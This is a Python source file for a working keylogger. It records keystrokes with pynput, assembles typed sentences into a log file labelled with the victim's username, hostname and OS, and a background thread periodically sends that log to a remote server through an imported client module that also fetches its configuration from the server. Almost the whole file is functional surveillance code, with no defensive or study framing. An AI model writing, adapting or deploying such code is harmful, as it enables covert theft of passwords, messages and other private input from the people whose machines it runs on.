# Import required modules
import os
import time
import socket
import platform
import threading
from pynput import keyboard
from client import send_logs, get_log_file, get_config_from_server, get_send_interval

# Get log file path and configuration from client module
log_file = get_log_file()

# Request configuration from server
print("Requesting configuration from server...")
get_config_from_server()

# Get the send interval (may be updated by server)
SEND_INTERVAL = get_send_interval()

current_sentence = ""
listener_active = True

# Get device identifier
def get_device_id():
    """Generate a unique device identifier"""
    hostname = socket.gethostname()
    username = os.getenv('USERNAME') or os.getenv('USER') or 'Unknown'
    system = platform.system()
    return f"{username}@{hostname}_{system}"

device_id = get_device_id()

# Write to log file
def write_log(message):
    """Write a log entry to file"""
    timestamp = time.strftime('%Y-%m-%d %H:%M:%S')
    log_entry = f'["{device_id}", "{timestamp}", {message}]\n'
    
    try:
        with open(log_file, 'a', encoding='utf-8') as f:
            f.write(log_entry)
    except Exception as e:
        print(f"Error writing log: {e}")

# Initialize log file
write_log('"=== Session Started ==="')

# Windows-specific: Map virtual key codes to characters
def vk_to_char(vk):
    """Convert Windows virtual key code to character"""
    vk_number_map = {
        0x30: '0', 0x31: '1', 0x32: '2', 0x33: '3', 0x34: '4',
        0x35: '5', 0x36: '6', 0x37: '7', 0x38: '8', 0x39: '9'
    }
    
    vk_numpad_map = {
        0x60: '0', 0x61: '1', 0x62: '2', 0x63: '3', 0x64: '4',
        0x65: '5', 0x66: '6', 0x67: '7', 0x68: '8', 0x69: '9'
    }
    
    if vk in vk_number_map:
        return vk_number_map[vk]
    elif vk in vk_numpad_map:
        return vk_numpad_map[vk]
    
    if 0x41 <= vk <= 0x5A:
        return chr(vk).lower()
    
    return None

# Timer function to send logs periodically
def auto_send_logs():
    """Send logs automatically every SEND_INTERVAL seconds"""
    global listener_active
    
    while listener_active:
        time.sleep(SEND_INTERVAL)
        
        if listener_active and os.path.exists(log_file):
            print(f"\n[{time.strftime('%H:%M:%S')}] Auto-sending logs...")
            
            success = send_logs()
            
            if success:
                write_log('"=== New Session ==="')

# Event - A key is pressed
def on_press(key):
    global current_sentence
    
    if hasattr(key, 'char') and key.char is not None:
        current_sentence += key.char
    elif hasattr(key, 'vk') and key.vk is not None:
        char = vk_to_char(key.vk)
        if char:
            current_sentence += char
    else:
        if key == keyboard.Key.space:
            current_sentence += " "
        elif key == keyboard.Key.enter:
            if current_sentence:
                write_log(f'"{current_sentence}"')
                current_sentence = ""
        elif key == keyboard.Key.backspace:
            if len(current_sentence) > 0:
                current_sentence = current_sentence[:-1]
        elif key == keyboard.Key.tab:
            current_sentence += "\t"

# Event - A key is released
def on_release(key):
    global listener_active, current_sentence
    
    if key == keyboard.Key.esc:
        print("\n[ESC pressed] Stopping keylogger...")
        
        if current_sentence:
            write_log(f'"{current_sentence}"')
        
        write_log('"=== Session Ended (Manual Stop) ==="')
        
        listener_active = False
        
        print("Sending final logs...")
        send_logs()
        
        return False

# Start the auto-send timer in a separate thread
print(f"\nKeylogger started!")
print(f"Device ID: {device_id}")
print(f"Log file: {log_file}")
print(f"Send interval: {SEND_INTERVAL} seconds")
print(f"Press ESC to stop manually\n")

timer_thread = threading.Thread(target=auto_send_logs, daemon=True)
timer_thread.start()

# Collect events until ESC is pressed
try:
    with keyboard.Listener(
            on_press=on_press,
            on_release=on_release) as listener:
        listener.join()
except KeyboardInterrupt:
    print("\n[Interrupted] Stopping keylogger...")
    listener_active = False
    write_log('"=== Session Ended (Interrupted) ==="')
    send_logs()

print("Keylogger stopped.")
